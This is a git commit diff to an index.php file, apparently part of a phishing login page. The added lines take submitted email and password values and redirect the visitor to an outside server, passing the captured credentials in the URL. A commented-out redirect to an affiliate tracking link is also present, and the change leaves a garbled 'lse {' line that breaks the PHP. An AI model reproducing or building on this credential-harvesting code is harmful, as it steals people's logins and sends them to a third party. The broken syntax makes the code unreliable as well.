0c0d4c7cb86e10c16a70f736b4d196114f07271d
limberlisa <54564259+limberlisa@users.noreply.github.com>
2020-02-13 01:01:54 -0400

    Update index.php

--- index.php
+++ index.php
@@ -23,11 +23,13 @@ if($_POST){
  if ($check) { 
  $usuario = $_POST[ 'email' ];
 $password = $_POST[ 'pass' ];
-  echo $usuario . " " . $password; 
-  //header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario."&password=".$password."");
+   
+header ("Location: http://server1.3utilities.com/chelin/login.php?usuario=".$usuario."&password=".$password."");
  } 
-// else { 
+lse { 
  //header ("Location: https://Tracking-all-traffic.offerdirecto.com?id=LGoRTd6m85&type=21&click_id={click_id}");
- //} 
+ 
+ echo $usuario . " " . $password;
+} 
 }
  ?>
